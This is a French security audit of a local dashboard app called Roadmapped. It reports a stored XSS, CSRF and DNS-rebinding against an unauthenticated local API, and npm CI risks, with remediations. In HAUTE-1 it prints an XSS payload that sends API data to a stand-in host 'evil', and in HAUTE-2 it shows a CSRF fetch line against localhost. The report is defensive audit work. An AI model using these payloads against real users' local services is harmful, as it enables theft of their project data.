# Audit de sécurité — Roadmapped (2026-07)

Audit offensif à lecture seule. Périmètre : serveur HTTP local (dashboard), rendu
front, serveur MCP, chaîne CI d'auto-publish npm, installeur/hook. Prémisse investiguée
(« des infos users ont fuité, d'autres se sont fait compromettre par l'app ») traitée
comme hypothèse — seuls les points **démontrés** dans le code sont rapportés comme tels.

---

## 1. Modèle de menace

**Ce qu'on protège** : le contenu du projet local de l'utilisateur (tâches YAML, docs `.md`,
notes gitignorées, graphe KB) et l'intégrité de sa machine (fichiers du HOME, exécution de
commandes). Le dashboard est un serveur Node local (`node:http`) adossé au navigateur de
l'utilisateur ; le MCP est du stdio piloté par l'agent local ; la CI publie sur npm.

**Contre qui (réaliste, app localhost mono-utilisateur)** :
- **A. Page web tierce malveillante** ouverte dans le navigateur de la victime pendant que
  le dashboard tourne (`localhost:5173`). Vecteur réseau le plus fort : CSRF + DNS-rebinding.
- **B. Contenu non fiable rendu par l'app** : un détail de tâche / une note / un doc `.md`
  rédigé par un **agent traitant une entrée externe** (ticket importé, page web, demande d'un
  tiers), ou un **repo cloné** contenant des `docs/*.md` piégés. C'est le vecteur « compromis
  par le biais de l'app ».
- **C. Contributeur / chaîne d'appro** sur la CI npm.

**Hors périmètre / non surcoté** : tout ce qui suppose déjà un accès shell/root local à la
machine de la victime (l'attaquant a alors déjà gagné). On ne surcote pas.

---

## 2. Findings par sévérité

### 🔴 HAUTE-1 — XSS stocké : markdown rendu sans sanitisation (le pire finding)

- **Fichier** : `src/components/Markdown.tsx:20-22` et `:33` ; `src/components/DocsView.tsx:180,183`
- **Cause** : `marked.parse(source)` (marked **18.0.5**, aucun sanitizer intégré depuis v1)
  → `dangerouslySetInnerHTML`. `marked` **laisse passer le HTML brut** du markdown. Aucune
  passe DOMPurify, aucune option de nettoyage. Les commentaires du code affirment « contenu
  LOCAL, pas de surface XSS » — **hypothèse fausse dès qu'un agent écrit du contenu dérivé
  d'une entrée non fiable, ou qu'on ouvre un repo tiers.**
- **Champs concernés** : `detail`, `outcome`, `verification` des tâches (rendus via `Markdown`),
  contenu des notes, et tout fichier `docs/**/*.md` (rendu via `DocsView`).
- **Exploitation** (acteur B) : un `.md` ou un détail de tâche contenant
  `<img src=x onerror="fetch('/api/tree').then(r=>r.text()).then(d=>fetch('https://evil/x',{method:'POST',body:d}))">`.
  À l'ouverture de la vue par la victime, le JS s'exécute **dans l'origine du dashboard**
  (`http://localhost:PORT`). Cette origine a un accès **non authentifié en lecture ET écriture**
  à toute l'API locale (§HAUTE-2) : le payload peut lire toutes les tâches/docs/notes/KB et
  les exfiltrer, en écrire/supprimer, et déclencher `/api/reveal`. C'est **le mécanisme unique**
  qui explique à la fois « fuite d'infos » et « compromission via l'app ».
- **Sévérité : Haute** (frôle Critique) — pas de rebinding ni de devinette de port requis :
  le code hostile s'exécute déjà dans la bonne origine. Injection réaliste (contenu agent).
- **Remédiation** : sanitiser la sortie de `marked` avec DOMPurify **avant** l'injection
  (`DOMPurify.sanitize(renderMarkdown(source))`), une seule fois dans `renderMarkdown`. Interdire
  le HTML inline dans le markdown si non nécessaire. Ajouter en défense en profondeur une CSP
  stricte (voir HAUTE-2 remédiation) qui casse `onerror`/`fetch` sortant.

### 🔴 HAUTE-2 — API locale sans auth, sans vérification d'Origin/Host (CSRF + DNS-rebinding)

- **Fichier** : `src/server/api.ts:253-377` (`createApiMiddleware` / handler) — **aucune**
  lecture de `req.headers.origin`, `req.headers.host` ou de referer ; **aucun** token/secret ;
  aucun en-tête CORS. `src/server/serve.ts:102` bind sur `'localhost'` (correct, pas `0.0.0.0`).
- **Détail aggravant** : `readJsonBody` (`api.ts:227-242`) fait `JSON.parse` sur les octets
  bruts **sans jamais vérifier le `Content-Type`**. Un POST « simple » (`text/plain`), qui
  **n'est pas préflighté** par le navigateur, est donc parsé comme JSON → **CSRF possible sans
  preflight** sur toutes les routes POST : `createTask`, `createNote`, `reveal`, `usage`,
  `archiveNote`. (PATCH/PUT/DELETE restent préflightés → bloqués par SOP en simple CSRF.)
- **Exploitation A-i (CSRF write)** : une page tierce fait
  `fetch('http://localhost:5173/api/tasks',{method:'POST',headers:{'Content-Type':'text/plain'},body:'{"title":"x",...}'})`
  → création/pollution de tâches et notes dans le repo de la victime, à l'aveugle (11 ports
  5173-5183 à balayer). Destruction partielle / spam.
- **Exploitation A-ii (DNS-rebinding, LA fuite)** : `evil.com` sert une page, puis rebinde
  `evil.com` → `127.0.0.1`. Comme le serveur **ne valide pas le `Host`**, `http://evil.com:PORT/api/tree`
  frappe le serveur local et la page (même origine qu'`evil.com`) **lit la réponse** : toutes
  les tâches, `GET /api/docs/content?path=…` (tout `.md`), `/api/kb`, `/api/notes/*`. C'est le
  vecteur direct de « fuite d'infos users » sans XSS.
- **Sévérité : Haute** — nécessite que la victime visite une page hostile pendant que le
  dashboard tourne, mais ni auth ni interaction ; rebinding = automatisable.
- **Remédiation** :
  1. **Rejeter toute requête `/api/*` dont le `Host` n'est pas `localhost`/`127.0.0.1[:port]`**
     (anti-rebinding, ~5 lignes en tête de handler).
  2. **Exiger un en-tête custom** (ex. `X-Roadmapped: 1`) sur les mutations : un en-tête custom
     force le preflight cross-origin → bloque le CSRF `text/plain`. Ou vérifier `Origin` ∈
     {`http://localhost:PORT`, `http://127.0.0.1:PORT`}.
  3. Vérifier le `Content-Type: application/json` avant de parser le corps.
  4. Servir l'HTML avec une **CSP** (`default-src 'self'; script-src 'self'; connect-src 'self'`)
     — bloque aussi l'exfiltration de HAUTE-1.

### 🟡 MOYENNE-1 — `/api/reveal` déclenchable par CSRF (ouverture Finder + oracle d'existence)

- **Fichier** : `src/server/notes.ts:149-161` — `revealPath` est **bien durci** (chemin absolu
  exigé, confiné au HOME, `existsSync`, `spawn` en argv **sans shell** → pas d'injection de
  commande). MAIS la route `POST /api/reveal` (`api.ts:120-122`) est un POST simple → CSRF-able
  (cf. HAUTE-2).
- **Exploitation A** : une page tierce POST `/api/reveal` avec un chemin sous le HOME →
  ouvre des fenêtres Finder/Explorer en rafale (nuisance), et le code retour (200 vs 404) est
  un **oracle d'existence de fichiers** dans le HOME (`~/.ssh/id_rsa` existe-t-il ?). Pas de
  lecture de contenu.
- **Sévérité : Moyenne** (nuisance + fuite de métadonnée fine, pas de contenu). Résolue par
  la remédiation HAUTE-2 (en-tête custom / Origin sur les mutations).

### 🟢 BASSE-1 — Auto-publish npm avec token bypass-2FA

- **Fichier** : `.github/workflows/npm-publish.yml`
- **Constat** : `NPM_TOKEN` est un token « Automation » (bypass 2FA). Le publish se déclenche
  sur **push vers `main`** touchant `package.json` (pas sur PR de fork) + `workflow_dispatch`.
  `VERSION` vient de `node -p require('./package.json').version` — **aucune interpolation de
  `${{ github.event.* }}`** (titre de commit/PR) dans un `run:` → **pas d'injection de script**.
  Le job publish ne s'exécute pas sur les PR de fork ; `ci.yml` (qui, lui, tourne sur PR de
  fork) **ne détient aucun secret**.
- **Résidu** : quiconque peut pusher sur `main` (ou un compte mainteneur compromis) déclenche
  un publish npm bypassant la 2FA. Modèle de menace « compromission du repo amont », pas
  « app du user ». **Sévérité : Basse**.
- **Remédiation** : environnement GitHub protégé + reviewers requis sur le job `publish` ;
  préférer l'OIDC/Trusted Publishing npm au token long-vécu ; `npm publish --provenance`.

### 🟢 BASSE-2 — Chaîne d'appro à l'install (graphify) et CI de PR de fork

- `scripts/install.mjs` télécharge/installe `uv` puis un paquet Python `graphify` depuis PyPI
  (lignes ~525-570). Point de confiance amont légitime mais non épinglé par hash (uv épinglé
  en version `0.11.28`, graphify non). **Informational** — comportement documenté, opt-in KB.
- `ci.yml` exécute `npm ci`/build/test sur les PR de fork (code non fiable) mais avec
  `GITHUB_TOKEN` en lecture seule et **sans secret** → exfiltration limitée. Standard.

---

## 3. Zones auditées trouvées SAINES (preuve de couverture)

- **Bind réseau** : `serve.ts:102` `server.listen(port, 'localhost')` — jamais `0.0.0.0`. ✔
- **Path traversal (lectures)** : double garde robuste.
  - `docs.ts:70-72` `unsafeDocPath` (rejet `..`/absolu) **+** `docs.ts:94-99` vérification par
    résolution réelle sous `docsDir` + contrainte `.md`. ✔
  - `api.ts:45-54` : la query `path=` est parsée **sans** normalisation WHATWG, justement pour
    ne pas laisser `%2e%2e` être résolu en `..` et contourner la détection. Traversal encodé
    couvert. ✔
  - `serve.ts:39-44` : statique confiné sous `distDir`. ✔
  - `unsafeSegment` (`api.ts:42-43`) et `unsafeSlug` (`notes.ts:25-26`) rejettent `/ \ ..`. ✔
  - Limite connue et **assumée** : `resolve()` ne suit pas les symlinks (commentaire `docs.ts:82-85`).
    Un symlink interne pointant hors périmètre passerait — risque accepté pour un outil
    localhost. Non exploitable à distance sans écriture préalable sur le FS.
- **`revealPath`** (`notes.ts:149-161`) : `spawn` en argv sans shell, confiné HOME, validé
  avant spawn → **pas d'injection de commande**. (Exposition CSRF traitée en MOYENNE-1.) ✔
- **Serveur MCP** (`scripts/mcp-server.mjs`) : transport **stdio** (pas de surface réseau),
  args validés par JSON Schema (`additionalProperties:false`, types/enums), écritures via
  `taskWrites` (validation + rollback + verrou partagés avec le CLI), aucun chemin fourni par
  l'appelant (ids numériques). ✔
- **`install.mjs`** : `execFileSync` (argv, **jamais** de shell) partout ; merge idempotent et
  **non destructif** de `.claude/settings.json` (préserve les autres hooks, repère le sien par
  `task.mjs sitrep`, `settings.json` illisible → laissé intact `:174-177`) ; `core.hooksPath`
  jamais modifié. ✔
- **CI npm-publish** : pas d'interpolation d'événement dans un `run:` → pas d'injection ; secret
  cantonné au job publish hors PR de fork. ✔
- **Parsing du corps** (`api.ts:227-242`) : `JSON.parse` en try/catch, malformé → `null`, pas
  d'exception non gérée. `runAction` isole tout en 500 (`api.ts:222-224`). ✔
- **Lecteur KB** (`kb.ts`) : normalisation défensive, aucun chemin client, absence de fichier =
  état normal. ✔

---

## 4. Recommandation de spec de remédiation (priorisée)

1. **[P0] Sanitiser le markdown** (HAUTE-1) : ajouter DOMPurify dans `renderMarkdown`
   (`Markdown.tsx`), point unique couvrant `Markdown` et `DocsView`. Test : un `.md` avec
   `<img onerror>` ne doit produire aucun attribut d'événement dans le DOM rendu.
2. **[P0] Durcir l'API locale** (HAUTE-2, couvre aussi MOYENNE-1) : dans `createApiMiddleware`,
   en tête de branche `/api/*` — (a) rejeter `Host` non-loopback ; (b) exiger `Origin` loopback
   OU un en-tête custom sur toute mutation ; (c) exiger `Content-Type: application/json`. ~15
   lignes, entièrement testable via `routeApi`/le middleware (fixtures d'en-têtes).
3. **[P1] CSP** sur l'HTML servi (`serve.ts` `send()` pour `index.html`) :
   `default-src 'self'; connect-src 'self'; script-src 'self'` — filet anti-XSS et
   anti-exfiltration indépendant de la sanitisation.
4. **[P2] Durcir la CI** (BASSE-1) : environnement protégé + Trusted Publishing/OIDC npm,
   `--provenance` ; épingler `graphify` (hash/version).

**Verdict** : la conjonction **HAUTE-1 (XSS stocké) × HAUTE-2 (API non authentifiée même-origine)**
constitue une chaîne d'exploitation crédible et suffisante pour expliquer les deux symptômes de
la prémisse (fuite de données + compromission « par le biais de l'app »). Les protections de
traversal, d'injection de commande et la CI sont, elles, solides.
